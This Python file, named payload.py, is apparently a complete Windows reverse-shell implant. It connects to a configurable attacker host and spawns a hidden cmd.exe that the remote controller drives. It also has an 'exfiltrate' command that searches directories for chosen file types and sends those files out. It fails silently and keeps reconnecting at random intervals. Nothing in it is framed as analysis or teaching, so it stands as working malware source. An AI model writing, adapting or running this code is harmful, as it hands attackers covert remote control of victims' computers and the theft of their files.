# payload.py
# The Unbreakable Soul. Forged with a resilient, non-blocking core.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import selectors

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
CHUNK_SIZE = 4096

def send_file_reliably(s_obj, file_path):
    """Sends a single file with lossless protocol."""
    try:
        if not os.path.exists(file_path) or not os.path.isfile(file_path):
            s_obj.sendall(b'FAIL_NOT_FOUND')
            return
        file_size = os.path.getsize(file_path)
        hasher = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b""):
                hasher.update(chunk)
        file_hash = hasher.hexdigest()
        header = f"{os.path.basename(file_path)}<SEP>{file_size}<SEP>{file_hash}"
        s_obj.sendall(b'\n[+] Preparing to send ' + header.encode() + b'\n') # Notify master
        s_obj.sendall(header.encode('utf-8'))
        ack = s_obj.recv(1024).decode('utf-8')
        if ack == 'ACK_HEADER':
            with open(file_path, 'rb') as f:
                s_obj.sendfile(f)
            s_obj.recv(1024) # Wait for final ack
    except Exception:
        pass # Fails silently for a single file

def handle_exfiltration(s_obj, command, current_dir):
    """Finds and sends files in a separate thread."""
    try:
        _, root_path, extensions_str = command.split('<SEP>')
        if not os.path.isabs(root_path):
            root_path = os.path.join(current_dir, root_path)
        extensions = [ext.strip() for ext in extensions_str.split(',')]
        found_files = []
        if os.path.isdir(root_path):
            for dirpath, _, filenames in os.walk(root_path):
                for filename in filenames:
                    if any(filename.endswith(ext) for ext in extensions):
                        found_files.append(os.path.join(dirpath, filename))
        s_obj.sendall(f"COUNT<SEP>{len(found_files)}".encode('utf-8'))
        ack = s_obj.recv(1024).decode('utf-8')
        if ack == 'ACK_COUNT':
            for file_path in found_files:
                send_file_reliably(s_obj, file_path)
    except Exception:
        pass
    finally:
        time.sleep(0.1)
        s_obj.sendall(b'END_EXFIL')

def run_conduit():
    while True:
        s_obj, p, sel = None, None, None
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            s_obj.setblocking(False)
            
            user_profile = os.environ.get('USERPROFILE', 'C:\\')
            p = subprocess.Popen(
                ['cmd.exe'],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                cwd=user_profile, creationflags=0x08000000
            )
            
            sel = selectors.DefaultSelector()
            sel.register(s_obj, selectors.EVENT_READ, 'socket')
            sel.register(p.stdout, selectors.EVENT_READ, 'stdout')
            sel.register(p.stderr, selectors.EVENT_READ, 'stderr')

            current_dir = user_profile

            while p.poll() is None:
                for key, mask in sel.select(timeout=1):
                    if key.data == 'socket':
                        data = s_obj.recv(4096)
                        if not data: raise ConnectionError("Master disconnected")
                        
                        cmd_str = data.decode(errors='ignore').strip()
                        if cmd_str.startswith('exfiltrate'):
                            exfil_cmd = f"EXFILTRATE<SEP>{' '.join(cmd_str.split()[1:])}"
                            threading.Thread(target=handle_exfiltration, args=(s_obj, exfil_cmd, current_dir)).start()
                        elif cmd_str.startswith('cd '):
                             # Update our internal tracker for the directory
                             try:
                                 new_dir = cmd_str.split(' ', 1)[1]
                                 if not os.path.isabs(new_dir): new_dir = os.path.join(current_dir, new_dir)
                                 # Normalize path (e.g., handle '..')
                                 current_dir = os.path.abspath(new_dir)
                             except: pass # Ignore cd errors, let cmd handle them
                             p.stdin.write(data)
                             p.stdin.flush()
                        else:
                            p.stdin.write(data)
                            p.stdin.flush()

                    elif key.data in ('stdout', 'stderr'):
                        pipe = key.fileobj
                        output = pipe.read(4096)
                        if output:
                            s_obj.sendall(output)
            
        except (ConnectionError, BrokenPipeError, TimeoutError):
            time.sleep(random.randint(20, 40))
        except Exception:
            time.sleep(random.randint(20, 40))
        finally:
            if sel: sel.close()
            if p: p.terminate()
            if s_obj: s_obj.close()

if __name__ == "__main__":
    run_conduit()